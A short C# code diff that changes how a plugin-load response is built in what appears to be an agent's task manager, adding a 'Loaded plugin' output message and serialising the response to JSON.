@@ -94,7 +94,8 @@ namespace Agent.Managers
                     LoadCommandResponseResult cr = new LoadCommandResponseResult()
                     {
                         completed = true,
-                        process_response = new Dictionary<string, string> { { "message", "0x1D" } },
+                        //process_response = new Dictionary<string, string> { { "message", "0x1D" } },
+                        user_output = $"Loaded plugin {pluginName}",
                         task_id = task_id,
                         commands = new List<CommandsResponse>()
                                 {
@@ -105,7 +106,7 @@ namespace Agent.Managers
                                     }
                                 }
                     };
-                    this.messageManager.AddResponse(cr);
+                    this.messageManager.AddResponse(cr.ToJson());
                     return true;
                 }
             }
